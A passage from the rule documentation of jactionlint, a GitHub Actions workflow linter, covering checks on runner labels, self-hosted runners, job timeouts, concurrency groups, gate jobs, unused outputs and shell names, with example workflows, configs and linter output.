  deprecated-runner-label: warn
```

Output:

```
test.yaml:4:14: warning: runner label "macos-14" is deprecated: GitHub retires it on 2026-11-02 and fails jobs on it on scheduled brownout days in October 2026. use "macos-15" or "macos-26" instead (https://github.com/actions/runner-images/issues/13518) [deprecated-runner-label]
  |
4 |     runs-on: macos-14
  |              ^~~~~~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=deprecated-runner-label`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**What is reported.** The rule knows the labels of the images that GitHub has announced to retire, with the date of each, from a table in jactionlint. A deprecation that GitHub announces later is one more row in a later release. The rule reads `runs-on` and the values of `matrix.<key>` that `runs-on: ${{ matrix.<key> }}` selects. Jobs with `self-hosted` among the labels are not reported.

**Level and exit status.** The rule is not in the `default` profile, and a warning does not fail a run unless `--strict-exit` is set (see the [exit status](./cli.md#exit-status)), because the label works until its day. From the day of the retirement the label is unknown, and [`unknown-runner-label`](#check-runner-labels) reports it in every profile.

**Fix.** The rule has no automatic fix: jactionlint does not know which image your jobs can move to.

<a id="check-self-hosted-runner"></a>
## Self-hosted runners (pedantic)

The rule `self-hosted-runner` (in the `pedantic` profile, level `info`) points out jobs that run on a self-hosted runner.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: [self-hosted, linux]
    steps:
      - run: make
```

Example config:

```yaml
rules:
  self-hosted-runner: info
```

Output:

```
test.yaml:4:15: info: job runs on a self-hosted runner (label "self-hosted"). self-hosted runners are hard to secure and should not run workflows of untrusted pull requests of a public repository [self-hosted-runner]
  |
4 |     runs-on: [self-hosted, linux]
  |               ^~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=self-hosted-runner`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**What is reported.** A job is reported when it has:

- the `self-hosted` label in `runs-on:`, also when it comes from a literal value of the matrix;
- a label that the key `self-hosted-runner.labels` of the configuration file lists (the key at the top level of the file, not an option under `rules`; a glob such as `arc-*` is allowed). The runners of an ARC runner set have no `self-hosted` label, only the name of the set. The same key lists the larger runners of GitHub with a name of your choice, so that [`unknown-runner-label`](#check-runner-labels) accepts them, and this rule reports them too: use the rule option `allow` for them;
- a runner group, `runs-on: {group: ...}`, which holds self-hosted runners or larger runners.

**Why it is informational.** [Self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security) are hard to secure: unless they are ephemeral, a job can leave something behind for the next one, and GitHub does not recommend them for public repositories, where any pull request can run code on them. When a pull request event starts the workflow (`pull_request`, `pull_request_target`, `pull_request_review`, `pull_request_review_comment`, also of a workflow that calls a reusable workflow), the message says so. The rule cannot see how a runner is set up, nor whether the repository is public, so it is informational and not a default finding: in a private repository, or with approval and ephemeral runners, a pull request on a self-hosted runner is normal.

**What is not reported.** Runner labels of third-party providers (without the `self-hosted` label), and labels that come from an expression the rule cannot resolve.

**Configure.** Two rule options narrow the finding down:

```yaml
rules:
  self-hosted-runner:
    allow: ["arc-ephemeral-*", "ci-runners"]  # glob patterns of labels and runner groups which are ephemeral or trusted
    pull-request-only: true                    # only workflows that a pull request event can start
```

The labels written in `runs-on` all apply to the runner, so one allowed label (or an allowed group) leaves the job alone. The values that a matrix gives to an expression are alternatives, one run each, so an allowed value leaves only its own run out and the others are judged. A group written with an expression is not matched against `allow`. A reusable workflow is judged by its own events and by those of the workflows that call it. When its callers are not all known, `pull-request-only` reports it.

To keep the finding for the pull request case only, set the level and the option together, for example `rules: {self-hosted-runner: {level: warn, pull-request-only: true}}`.

**Fix.** If you must use self-hosted runners in a public repository, require approval for the workflows of outside contributors and use ephemeral (just-in-time) runners.

<a id="check-timeout-minutes"></a>
## Timeout minutes of jobs

The rules `missing-timeout` (in the `default` profile) and `timeout-too-long` (only when you set `max`) report a job without `timeout-minutes` and a job whose `timeout-minutes` is larger than the maximum you choose. A job without a timeout can run for six hours (and be billed for it) when a step hangs.

Example input:

```yaml
on: push
jobs:
  no-timeout:
    runs-on: ubuntu-latest
    steps:
      - run: echo hello
  too-long:
    runs-on: ubuntu-latest
    timeout-minutes: 120
    steps:
      - run: echo hello
```

Example config:

```yaml
rules:
  missing-timeout: error
  timeout-too-long:
    max: 60
```

Output:

```
test.yaml:3:3: "timeout-minutes" is not set at this job. Set it to avoid wasting runner minutes when the job hangs. Set "default-minutes" in the "missing-timeout" rule options of the configuration to turn on the --fix fix [missing-timeout]
  |
3 |   no-timeout:
  |   ^~~~~~~~~~~
test.yaml:9:22: "timeout-minutes" is 120, which is greater than the maximum 60 minutes allowed by the configuration [timeout-too-long]
  |
9 |     timeout-minutes: 120
  |                      ^~~
```

<!-- Skip playground link -->

The example enables both rules with the `rules` section of the example config, which is an entry of the [configuration file](./config.md#rule-levels-and-options). `missing-timeout` is on without it, and its line shows the default level.

The output keeps only these two rules. To reproduce it, save the example as `.github/workflows/test.yaml`, use the configuration of this section and run `jactionlint --select=missing-timeout,timeout-too-long`.

**What is reported.**

- `missing-timeout` reports jobs which do not set [`timeout-minutes`](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idtimeout-minutes). Without it, a hanging job runs until the default timeout of 360 minutes. Jobs calling a reusable workflow are not checked, since they do not support the key.
- `timeout-too-long` reports jobs whose `timeout-minutes` is larger than the `max` option. It works without `missing-timeout`. Values given by expressions `${{ }}` are not checked.

**Configure.** To turn `missing-timeout` off, set `missing-timeout: off` in `rules`, or ignore one job with an [ignore comment](./ignore.md#ignore-some-errors) on the line before the job.

#### Jobs whose steps all set a timeout

[ghalint](https://github.com/suzuki-shunsuke/ghalint/blob/main/docs/policies/012.md) accepts a job without `timeout-minutes` when every step of it sets `timeout-minutes`. `missing-timeout` still reports such a job, because the timeout of a step does not cover everything a job does. GitHub applies it to the step, not to setting up the job (downloading the actions), to the post steps of actions (the cleanup of `actions/checkout`, saving a cache) or to completing the job, so a hang there still runs for six hours. When you do want the reading of ghalint, say so with the `accept-step-timeouts` option:

```yaml
rules:
  missing-timeout:
    accept-step-timeouts: true
```

Then a job without `timeout-minutes` is accepted when it has steps and every one of them, `uses:` and `run:` steps alike, sets `timeout-minutes`. A value given by an expression `${{ }}` counts as set. A job where one step has none is still reported, and so is a job which sets none. Because the job is accepted, there is no finding and so no `--fix` for it. Without the option the finding stays, and `--fix` with `default-minutes` adds the job-level key as for any other job. The option is off by default, because the timeout of a step does not cover everything a job does.

#### Fixing missing timeouts

jactionlint has no built-in number of minutes, because the right limit depends on your jobs. The finding tells you to set `timeout-minutes`, and `jactionlint --fix` adds it only when you configure the number with the `default-minutes` option:

```yaml
rules:
  missing-timeout:
    default-minutes: 15
```

Then `--fix` adds `timeout-minutes: 15` to every job which has none. It is a safe fix: a job which is cancelled after that time is the only way it can change a workflow, and one which really needs longer sets its own value. The line goes right after `runs-on:` (or after `name:`, or as the first key of the job when it has neither), with the indentation of the job's other keys and the line endings of the file. Without `default-minutes` the finding has no fix.

When `timeout-too-long` has a `max` smaller than `default-minutes`, the fix uses `max` so the result stays clean. On a job that runs only on `ubuntu-slim` the fix writes at most 15, the [limit of that runner](#check-ubuntu-slim-limits), so that it does not add a finding of that check. Jobs calling a reusable workflow are skipped, since they do not support `timeout-minutes`. A job written in the flow style (`job: {runs-on: ...}`) or with a YAML anchor is still reported but has no fix: jactionlint does not guess where to put a key there.

To choose the number from data, run `jactionlint --suggest-timeouts`. It reports how long the jobs of the latest successful runs of each workflow took, read from GitHub, with the number of samples and a `timeout-minutes` to consider for each job. It implies `--online`, writes nothing and suggests no value for a job that has too few samples. [Suggest timeouts from the history of the runs](./online.md#suggest-timeouts) shows the report, and [the online options](./cli.md#github-api-online-checks) list `--timeout-history-runs` and `--timeout-buffer`, which tune it.

<a id="check-concurrency-limits"></a>
## Concurrency limits

The rule `concurrency-limits` (in the `default` profile) reports a workflow without a `concurrency:` setting, and a workflow whose `concurrency:` is written as a plain group name (`concurrency: my-group`), which cannot cancel anything. By default GitHub runs every instance of a workflow at the same time, even when a new run supersedes the old ones. That wastes runner minutes and can make workflows race when they look for artifacts by workflow and job names.

Example input:

```yaml
on:
  pull_request:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: make test
```

Example config:

```yaml
rules:
  concurrency-limits: error
```

Output:

```
test.yaml:1:1: workflow has no "concurrency:", so every run of it executes at the same time even when a newer run supersedes the older ones. add a top-level "concurrency:" with a "group:" and "cancel-in-progress: true". use a group per pull request such as "${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}", so that a new push cancels only the older runs of the same pull request and not the runs of the others [concurrency-limits]
  |
1 | on:
  | ^~~
```

<!-- Skip playground link -->

The rule is on in the `default` profile at the level `error`. The output keeps only this rule: to reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=concurrency-limits`. This `rules` section of the [configuration file](./config.md#rule-levels-and-options) sets the level explicitly; the example config of this section is such an entry.

**Fix.** Add a top-level `concurrency:` with a group and `cancel-in-progress: true` (or an expression which is true in most cases):

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true
```

For a workflow that pull requests start, this group is per pull request: a new push cancels the older runs of the same pull request and nothing else. A group that is the same for every pull request would cancel the runs of unrelated ones, which [`concurrency-cancels-prs`](#check-concurrency-cancels-prs) reports.

**Workflows that release or deploy.** These need the opposite. Cancelling a run that is half done leaves a half done release, and [`concurrency-cancels-release`](#check-concurrency-cancels-release) reports exactly that. It applies to a workflow that:

- runs on the `release` event or on pushed tags;
- has a job with an `environment:`;
- publishes a package, pushes tags or deploys, whatever the tool (`release-plz`, `semantic-release`, `changesets`, `cargo publish`, `git push --tags`; the full list is in [that section](#check-concurrency-cancels-release)).

For such a workflow the advice is `cancel-in-progress: false`, so that a new run waits for the running one. The message also names `queue: max` for the case that no release may be skipped. There is no fix for it, and the plain group name (`concurrency: release`), which queues runs and cancels none, is accepted. The two rules never contradict each other: the block that one recommends is not reported by the other.

**What is not reported.** Whether to cancel is a choice, so a `concurrency:` mapping that does not cancel (to serialize releases, for example) is accepted, and so is a `queue:`. The rule skips:

- workflows that only run through `workflow_call` (the caller decides);
- workflows that only run on a `schedule` or by `workflow_dispatch` (no new commit supersedes such a run, but see the option `pedantic` in this section);
- workflows where every job sets its own `concurrency:`;
- the workflow `.github/workflows/copilot-setup-steps.yml`: GitHub runs it when the Copilot coding agent starts, from a job with a fixed ID, and a concurrency group has no use there.

A caller workflow whose jobs all call reusable workflows is reported like any other, because a `concurrency:` in the called workflow can deadlock with the one of its caller (see [concurrency deadlock](#check-concurrency-deadlock)), so the caller is where the limit belongs.

**Schedule-only and manual-only workflows.** With the option `pedantic` (on under the `pedantic` profile, off otherwise, so the `default` profile reports what it always did) the rule also reports a workflow that only a `schedule` or a `workflow_dispatch` starts, as zizmor does. A run of such a workflow is not superseded by a commit, but it can overlap with the next scheduled run, with a manual one, or with itself when it takes longer than the interval. The advice differs from the one for pull requests on purpose:

- It asks for a top-level `concurrency:` with a `group:` such as `${{ github.workflow }}` and does **not** suggest `cancel-in-progress: true`. A scheduled run that is cancelled is not started again, so the work of the run (a release, a synchronization, a report) is lost or left half done. A group without `cancel-in-progress` makes a new run wait for the running one. Set `cancel-in-progress: true` only when a run can be thrown away without loss.
- Only one run can wait in a group: while one run is going and two more start, the newer waiting run replaces the older waiting one, so an occurrence of the schedule can be skipped. The message says so and names `queue: max` (up to 100 runs wait) for a workflow in which every occurrence must run. For a manual run that takes inputs it adds that the inputs belong in the group, so that runs with other inputs do not replace each other.
- The group of a workflow and the groups of its jobs are one set of names, and at most one run holds a group at a time, so a job whose `concurrency.group` equals the group of its own workflow run waits for the run that contains it. When a job already uses the suggested group (compared without regard to spaces inside `${{ }}`), the message suggests `${{ github.workflow }}-workflow` instead, and so on if that one is used too.
- A `concurrency:` that is only a group name (`concurrency: nightly`) is reported too, because zizmor reports it. It already behaves like `cancel-in-progress: false`, so the advice is to write the mapping form with an explicit `cancel-in-progress: false`. It is not reported for a workflow that releases or deploys, where the plain group is what is wanted.
- There is no fix. The group is the choice of the author, and the fix of this rule only ever adds a group per pull request.

The mapping form without `cancel-in-progress`, or with `cancel-in-progress: false`, is accepted for every kind of workflow, also with the option. A `concurrency:` that is an expression (`concurrency: ${{ github.workflow }}`) can be a whole configuration, so it is not taken for a group name. A workflow in which every job has a `concurrency:` of its own is not reported.

**What `--fix` does.** `jactionlint --fix` adds the `concurrency:` block of the fix after `on:`, with a blank line between `on:` and the block (as it does for the `permissions:` it adds). It does this only when it is safe to do so, that is, for a workflow where:

- all triggers are events of a pull request (`pull_request`, `pull_request_target`, `pull_request_review` and `pull_request_review_comment`);
- no job has an `environment:`, or publishes or deploys anything;
- no job has a `concurrency:` of its own;
- the file has no anchors or aliases.

It never adds the block to a workflow that a push, a tag, a release or a manual run starts, because cancelling those runs is a decision about the workflow: use the group of your choice there.

**Callers and called workflows.** Inside a called (reusable) workflow `github.workflow` is the name of the *caller*. If the caller and the workflow it calls both use `${{ github.workflow }}-${{ github.ref }}`, they share one group and the called workflow is cancelled at once. So for a workflow that has a job with `uses:`, the message and the fix write a group with a part of its own, `${{ github.workflow }}-caller-${{ github.event.pull_request.number || github.ref }}`. It never equals the group of a callee that follows the plain advice, and the message says so. Do not give a called workflow the same group as its caller.

<a id="check-concurrency-cancels-prs"></a>
## Concurrency that cancels unrelated pull requests

The rule `concurrency-cancels-prs` (in the `default` profile) reports a `concurrency` block (of the workflow or of a job) of a workflow that is triggered by `pull_request`, `pull_request_target`, `pull_request_review` or `pull_request_review_comment`, when `cancel-in-progress` is on and the `group` has nothing that differs between pull requests. All pull requests share the group, so a push to one of them cancels the run of another one that has nothing to do with it.

Example input:

```yaml
on:
  pull_request:
concurrency:
  group: ci
  cancel-in-progress: true
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo test
```

Output:

```
test.yaml:4:10: concurrency group "ci" is the same for every pull request (event "pull_request") and "cancel-in-progress" is enabled for them, so a new run for one pull request cancels the run of an unrelated one. add "github.head_ref" or "github.event.pull_request.number" to the group [concurrency-cancels-prs]
  |
4 |   group: ci
  |          ^~
```

[Playground](https://jactionlint.jdx.dev/#eNokzLsNwzAMhOFeU9wCWoDLBDZBOA4EUuGjyPaB5Pr/7kypAbPGeLl8SyKpsSmXuyj/VrzcahL4bgAfyjL6rX26XS4RhPSS9rEzFs79AABeGt2UUGdpVh/HajtFyoxHAX1JgvDb9vo/APykLz4=)

**Fix.** Add the pull request to the group:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}
  cancel-in-progress: true
```

There is no automatic fix, because which value distinguishes the runs is up to you.

**What the rule judges.**

- A group is fine when it reads something that differs between pull requests for the event: `github.head_ref`, `github.event.pull_request.number`, `github.event.number`, the head of the pull request, `github.run_id` and so on. For `pull_request` it also accepts `github.ref`, which is `refs/pull/<number>/merge`. It does **not** accept `github.ref` and `github.sha` for `pull_request_target`, because they are the base branch there, and it does not accept `github.head_ref` for `pull_request_review`, where it is empty.
- `cancel-in-progress` counts as on when it is `true` or an expression that is true for the pull request event as far as the rule can tell from `github.event_name` and `github.ref`. The idiom `cancel-in-progress: ${{ github.event_name == 'pull_request' }}` is on for pull requests, so it is reported when the group is shared. An expression that depends on something else (a variable, an input) is not reported.
- A group that reads `env`, `vars`, `inputs`, `needs`, `steps` or `secrets` is not reported, because the rule cannot see its value.
- For `pull_request_review`, `github.event.review.id` is different for every review, and for `pull_request_review_comment` `github.event.comment.id` is different for every comment, so a group that reads them is fine.
- A `concurrency` block is not reported for an event when the `if:` of every job it covers is false for it (`if: github.event_name == 'push'` under `pull_request`).

**Configure.** To turn the rule off, use `rules: {concurrency-cancels-prs: off}` in the [configuration file](./config.md#rule-levels-and-options), or put an [ignore comment](./ignore.md#ignore-some-errors) on the `group:` line (`# jactionlint ignore=concurrency-cancels-prs`).

<a id="check-concurrency-cancels-release"></a>
## Concurrency that cancels a release

The rule `concurrency-cancels-release` (in the `default` profile) reports `cancel-in-progress` that cancels a release or a deployment which is still running: a new push, tag or manual run must not kill an in-flight release. Cancelling the run of a publish half way can leave a tag without its packages, a registry with some of the files or a deployment half rolled out.

Example input:

```yaml
on:
  push:
    tags: ["v*"]
concurrency:
  group: release
  cancel-in-progress: true
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: cargo publish
```

Output:

```
test.yaml:6:23: "cancel-in-progress" is enabled here (job "publish" runs "cargo publish" and the workflow runs for pushes of tags), so a new run cancels a release or deployment which is still running and can leave it half done. set "cancel-in-progress: false" (or remove it) to let the running one finish first. keep the group per ref or tag so that unrelated releases do not wait for each other, and add "queue: max" when no release may be skipped (otherwise a newer pending run replaces an older pending one) [concurrency-cancels-release]
  |
6 |   cancel-in-progress: true
  |                       ^~~~
test.yaml:11:14: "cargo publish" publishes to crates.io. prefer trusted publishing with rust-lang/crates-io-auth-action and the permission "id-token: write" [use-trusted-publishing]
   |
11 |       - run: cargo publish
   |              ^~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo0zD2qwzAQxPFepxhcPtAFdJVHCnlZFAexK/YjkNsHx7iaYv78VFoBVvrzXCD68Ib/7f23PQqpUJqx0Od8h2muBuPJ3bkA1IV41kPqMh3G7g1hyeWlu1/uPo+bthSvKg25p0TW2YM9fpcHL78qoJ5lA3UbegvfAQA6LzT4)

The second finding of the output belongs to another rule, `use-trusted-publishing`: the `cargo publish` of the example triggers it.

**What is reported.** A `concurrency` block of the workflow or of a job is reported when `cancel-in-progress` is on for a trigger other than a pull request and one of these is true:

- The workflow runs for a tag push or a `release` event, and the group does not name the ref. This is the case where the next tag cancels the release of the previous one.
- A job under the block publishes or deploys. That is a job with an `environment:`, a step that uses a release or deploy action (for example `softprops/action-gh-release`, `pypa/gh-action-pypi-publish`, `actions/deploy-pages`, `cloudflare/wrangler-action`, `goreleaser/goreleaser-action` with `release` in `args` and without `--snapshot`, `--skip=publish` or `--skip-publish`), a `docker/build-push-action` with `push` on, or a `run:` step with a command such as `npm publish`, `cargo publish`, `twine upload`, `gh release create`, `docker push`, `wrangler deploy` or `kubectl apply`. A job or step whose `if:` is false for the trigger is ignored (`if: startsWith(github.ref, 'refs/tags/')` does not count for a push to a branch). `--dry-run` commands do not count.
- A job pushes tags or runs a release tool. This does not depend on the name of one tool: `release-plz release`, `semantic-release`, `release-it`, `changeset publish`, `lerna publish`, `mvn deploy`, `gradle publish`, `dotnet nuget push` and `cargo release --execute` count, and so do actions such as `release-plz/action`, `changesets/action` and `semantic-release/semantic-release`. `git push --tags`, `git push --follow-tags`, a push of a ref that is named like a tag or a version (`git push origin v1.2.3`, `git push origin "$TAG"`, `refs/tags/...`), and a job that runs both `git tag <name>` and `git push` count as pushing tags. Commands that only open a pull request or edit files (`release-plz release-pr`, `changeset version`) and `cargo release` without `--execute` do not.

**What is not reported.**

- The mixed idiom `cancel-in-progress: ${{ github.event_name == 'pull_request' }}` (false for pushes and tags) and other expressions that are false for the trigger.
- An expression that depends on something the rule cannot see (an input, a variable).
- A group that names the release (`inputs.*`, `github.event.release.*`) and, for tag pushes, releases and manual runs, a group that names the ref, because then only a second run for the same ref replaces the first one.
- A group with `github.run_id` or `github.run_number` (also as the fallback of an empty value: `github.head_ref || github.run_id` is the run id for a push), which is different for every run, so no run cancels another.
- Workflows that only run for pull requests.
- An `environment:` whose name does not say it is a place to release to. It counts when its name is `production`, `staging`, `preview`, `release`, `pages`, `npm`, `pypi` and so on; `ci`, or `${{ matrix.environment }}` used to scope secrets of a test job, does not.
- Names of workflows and jobs: they are not taken as a signal.

**What to write for a release:**

```yaml
concurrency:
  group: release-${{ github.ref }} # one group per tag or branch, so that unrelated releases do not wait for each other
  cancel-in-progress: false # or leave it out: false is the default
  queue: max # when no release may be skipped
```

`cancel-in-progress: false` lets the running release finish. Without `queue`, GitHub keeps one pending run per group and a newer pending run replaces the older pending one, which skips that release. `queue: max` keeps the pending runs in a queue instead, so every release runs. It cannot be combined with `cancel-in-progress: true`, and jactionlint accepts it. A group per tag or ref is what keeps the releases of different tags from queueing behind each other.

**Fix.** The fix sets a literal `cancel-in-progress: true` to `false`. It is **unsafe** (`--fix=unsafe`, see [safe and unsafe fixes](./fix.md#safe-and-unsafe-fixes)) because the runs of a group queue instead of replacing each other, which changes when and how often the workflow runs. Expressions are not fixed.

**Configure.** To ignore the rule, put `# jactionlint ignore=concurrency-cancels-release` on the line (see [ignore comments](./ignore.md#ignore-some-errors)), or turn it off with `rules: {concurrency-cancels-release: off}`.

<a id="check-gate-job-skipped-on-failure"></a>
## Gate jobs that are skipped when a job fails

The rule `gate-job-skipped-on-failure` (in the `default` profile, level `error`) reports a job that has `needs` and reads the result of the jobs it needs, but whose own `if:` has no status check function. GitHub adds an implicit `success()` to such a job, so it is **skipped** when a needed job fails, is cancelled or is skipped. The gate never sees a failure, and a skipped job counts as passing for a required status check, so the failure goes through the gate.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo test
  final:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - run: test "${{ needs.test.result }}" = success
```

Output:

```
test.yaml:7:3: job "final" reads "needs.test.result" but has no "if" with a status check function, so GitHub skips the job when a job it needs fails or is skipped, and a skipped job counts as passing for a required check. add "if: ${{ !cancelled() }}" (or "always()") to the job [gate-job-skipped-on-failure]
  |
7 |   final:
  |   ^~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqUzEEKgzAQheG9p3hIt/EAgR5G0ym2hIn4Zlbi3cs0pXtXIXz/vKYZm3Md3m1hHgATWrzA7soU7oureapz2JdosrFXQIoyQ8ra8CueL51rdxV5MON/enE1EOPtOPrQFP9pF3o1nOeIO+ilCPkZABeBPj4=)

**Fix.** Add a status check function that lets the job run, and check the results yourself:

```yaml
final:
  needs: [build, test]
  if: ${{ !cancelled() }}
  runs-on: ubuntu-latest
  steps:
    - run: test "${{ contains(needs.*.result, 'failure') }}" = false
```

There is no automatic fix: whether `always()` or `!cancelled()` is right depends on whether the gate should run for a cancelled workflow.

**What is reported.** The rule looks at the whole job: its `if:`, the steps, `env`, `with`, `outputs` and the rest. It reports a read of `needs.<job>.result` or `needs.<job>.outcome`, of `needs.*.result`, and of the whole `needs` context (for example `toJSON(needs)`). `always()`, `cancelled()` and `failure()` (also negated, as in `!cancelled()`) in the job's `if:` satisfy the rule; an explicit `success()` does not, because it is what GitHub adds anyway.

**What is not reported.**

- A read that only compares the result with `'success'` using `==` (`if: needs.build.result == 'success'`). It is redundant in a job that is skipped unless its needs succeeded, but it does not expect to see a failure.
- Jobs that need a job with `continue-on-error`, because the result of that job is not what it seems.
- A job that tests results only in its own job-level `if:`, to run after its needs went well (`needs.a.result == 'success' || needs.a.result == 'skipped'`, `needs.a.result != 'skipped'`, `!= 'failure'`). That is a publish, a deploy or a cleanup that is meant to be skipped on a failure, not a gate. A job-level condition is a gate only when it expects the failure itself: `== 'failure'`, `== 'cancelled'`, `!= 'success'`. A gate is a job that reports what happened to its needs, so it reads results in its steps, `env`, `with` or `outputs`.
- Reads of `needs.<job>.outputs.*`.
- A workflow where an expression does not parse (`expression-syntax` reports the invalid expression).

<a id="check-continue-on-error"></a>
## Failures hidden by continue-on-error (pedantic)

The rule `continue-on-error` (in the `pedantic` profile, level `info`) reports a job with a literal `continue-on-error: true`. The workflow succeeds when the job fails, so nobody sees the failure unless they open the job. Some jobs are meant to be advisory; for those the finding is a reminder to keep it deliberate.

Example input:

```yaml
on: push
jobs:
  lint:
    runs-on: ubuntu-24.04
    continue-on-error: true
    steps:
      - run: echo lint
```

Example config:

```yaml
rules:
  continue-on-error: info
```

Output:

```
test.yaml:5:24: info: "continue-on-error: true" makes the workflow pass even when job "lint" fails, which hides failures. remove it, or limit it to what is allowed to fail, for example with an expression on a matrix entry [continue-on-error]
  |
5 |     continue-on-error: true
  |                        ^~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=continue-on-error`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**What is not reported.** An expression (`continue-on-error: ${{ matrix.experimental }}`), because it is the usual way to allow the failure of some matrix entries only.

**Configure.** Steps with `continue-on-error: true` are reported only when you set the `steps` option:

```yaml
rules:
  continue-on-error:
    steps: true
```

**Fix.** There is no automatic fix: removing the line turns an advisory job into a blocking one.

<a id="check-unused-job-output"></a>
## Unused job outputs

The rule `unused-job-output` (in the `default` profile, level `error`) reports an entry of `jobs.<id>.outputs` that nothing reads: no job reads `needs.<id>.outputs.<name>` and no output of a reusable workflow (`on.workflow_call.outputs`) uses `jobs.<id>.outputs.<name>`. The output is dead code, and it makes a reader look for a consumer that does not exist.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=1.0.0" >> "$GITHUB_OUTPUT"
  test:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo test
```

Output:

```
test.yaml:6:7: output "version" of job "build" is never used: no other job reads "needs.build.outputs.version". remove it [unused-job-output]
  |
6 |       version: ${{ steps.v.outputs.version }}
  |       ^~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqEjrHKgzAUhXef4hBcDf5r4Hfo0nZqB51LrQEtkoj3Xhfx3UtiSqFLt4TznXs+7wwmoT57+pZMBrQyjF14ALM4KgIgrTiWYryzJY6RF56EaeeAxc40BDJfVxDbifSiE6NTiG2LdIzfxQJDZ7CkX5w0sI/eQ6Xa/58udalQVVD58VyfmsPt0tTXplYZEIT2W87ajsyu/8v+S+EzGojXALG2Uaw=)

**What counts as a read.** The rule reads every expression of the workflow. A read of a whole object counts as a read of everything in it: `toJSON(needs.build.outputs)`, `toJSON(needs)`, `needs[matrix.job].outputs.x`. When an expression does not parse, nothing is reported. Outputs can only be read inside the workflow, so an output of a reusable workflow that its callers use is a `workflow_call` output, not a job output.

**Fix.** There is no automatic fix because removing an output means removing a block of YAML and finding its step.

<a id="check-unused-needs"></a>
## Needs entries that do nothing (pedantic)

The rule `unused-needs` (in the `pedantic` profile, level `info`) reports an entry of `needs` that has no effect: the job never reads the outputs or the result of the needed job, and another job it needs already depends on it, so the entry changes neither the order of the jobs nor whether the job runs.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo build
  test:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo test
  publish:
    needs: [build, test]
    runs-on: ubuntu-latest
    steps:
      - run: echo publish
```

Example config:

```yaml
rules:
  unused-needs: info
```

Output:

```
test.yaml:13:13: info: job "publish" needs "build" but never reads its outputs or result, and it already needs "test" which waits for "build". this entry changes nothing and can be removed [unused-needs]
   |
13 |     needs: [build, test]
   |             ^~~~~~
```

<!-- Skip playground link -->

The output keeps only this rule. To reproduce it, save the example as `.github/workflows/test.yaml` and run `jactionlint --select=unused-needs`, which also runs rules that the profile does not enable. To keep the rule on, set its level in the [configuration file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**What is reported.** An entry is reported only when this can be shown. The other needed job must wait for the job directly or through other jobs, and none of the jobs on the way may have a status check function in its `if:` (`always()`, `!cancelled()`, `failure()`, ...), because such a job runs even when its needs failed, and then the entry changes the result.

**What is not reported.** An entry that is only there for the order (`needs: [a, b]` with unrelated jobs), because the rule cannot tell it from a forgotten one.

**Fix.** There is no automatic fix.

<a id="check-shell-names"></a>
## Shell name validation at `shell:`

The rule `invalid-shell-name` reports a `shell:` value that is not one of the shells that GitHub provides on the runner of the job. It checks the `shell:` of a step and the `shell:` of `defaults.run` at the job and at the workflow level.

Example input:

```yaml
on: push
jobs:
  linux:
    runs-on: ubuntu-latest
    steps:
      - run: echo 'hello'
        # ERROR: Unavailable shell
        shell: dash
      - run: echo 'hello'
        # ERROR: 'powershell' is only available on Windows
        shell: powershell
  mac:
    runs-on: macos-latest
    defaults:
      run:
        # ERROR: default config is also checked. fish is not supported
        shell: fish
    steps:
      - run: echo 'hello'
        # OK: Custom shell
        shell: 'perl {0}'
  windows:
    runs-on: windows-latest
    steps:
      - run: echo 'hello'
        # ERROR: 'sh' is only available on Windows
        shell: sh
      - run: echo 'hello'
        # OK: 'powershell' is only available on Windows
        shell: powershell
```

Output:

```
test.yaml:8:16: shell name "dash" is invalid. available names are "bash", "pwsh", "python", "sh" [invalid-shell-name]
  |
8 |         shell: dash
  |                ^~~~
test.yaml:11:16: shell name "powershell" is invalid on macOS or Linux. available names are "bash", "pwsh", "python", "sh" [invalid-shell-name]
   |
11 |         shell: powershell
   |                ^~~~~~~~~~
test.yaml:17:16: shell name "fish" is invalid. available names are "bash", "pwsh", "python", "sh" [invalid-shell-name]
   |
17 |         shell: fish
   |                ^~~~
test.yaml:27:16: shell name "sh" is invalid on Windows. available names are "bash", "cmd", "powershell", "pwsh", "python" [invalid-shell-name]
   |
27 |         shell: sh
   |                ^~
```

